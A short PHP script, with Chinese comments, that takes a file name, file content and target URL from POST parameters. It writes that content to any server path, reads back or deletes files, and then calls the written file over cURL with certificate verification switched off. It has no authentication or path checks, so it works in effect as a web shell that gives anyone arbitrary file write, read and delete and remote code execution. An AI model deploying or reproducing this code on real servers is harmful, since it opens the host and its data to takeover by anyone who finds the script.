<?php
$a=$_POST['文件'];
$b=$_POST['内容'];
$c=str_replace('$','&',$_POST['post']);
$d=str_replace('$','&',$_POST['get']);
$e=$_POST['网址'];
$f=substr($c, 0, strlen('%'))=='%';
//php  post方法，支持 http，https协议
    function post($url,$data){
        //初始化一个CURL会话
        $curl = curl_init(); 
        //访问的地址
        curl_setopt($curl, CURLOPT_URL, $url); 
        //认证证书来源的检查
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0); 
        
        //证书中检查SSL加密算法是否存在
        curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 1);
        
        //模拟浏览器
        curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']); 
        //发送Post请求
        curl_setopt($curl, CURLOPT_POST, 1); 
        
        //Post方式，发送数据包
        curl_setopt($curl, CURLOPT_POSTFIELDS, $data); 
        
        //设置超时
        curl_setopt($curl, CURLOPT_TIMEOUT, 30); 
        
        //返回Header内容
        curl_setopt($curl, CURLOPT_HEADER, 0); 
        
        //文件流的形式返回
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
        
        //执行操作
        $result = curl_exec($curl); 
        if (curl_errno($curl)) {
            echo '错误信息;'.curl_error($curl);
        }
        
        //关闭CURL
        curl_close($curl); 
        
        //返回数据
        return $result; 
    }
    if($c!='*'&&$c!='@'&&!$f){
    $myfile = fopen($a, "w") or die("Unable to open file!");
fwrite($myfile, $b);
fclose($myfile);
$myfile1 = fopen($a.'.lm', "w") or die("Unable to open file!");
fwrite($myfile1, $b);
fclose($myfile1);
if($d==null) echo post("$e/$a",$c);
if($d!=null) echo post("$e/$a?$d",$c);
}
if($c=='*'){
$myfile = fopen($a, "w") or die("Unable to open file!");
fwrite($myfile, $b);
fclose($myfile);
$myfile1 = fopen($a.'.lm', "w") or die("Unable to open file!");
fwrite($myfile1, $b);
fclose($myfile1);
echo '写入成功';
}
if($c=='@'){
$str = file_get_contents("$a.lm");//将整个文件内容读入到一个字符串中




echo '<啊那嘛>'.$str;

}
if($c=='!'){
unlink($a);
unlink($a.'.lm');
echo '删除成功';
}


//php判断字符串开头：
if(substr($c, 0, strlen('%'))=='%'){
$scr=substr($c,strlen('%'), -1);
$myfile3 = fopen('dump.php', "w") or die("Unable to open file!");
fwrite($myfile3, $b);
fclose($myfile3);
if($d==null) echo post("$e/dump.php",$scr);
if($d!=null) echo post("$e/dump.php?$d",$scr);
    }
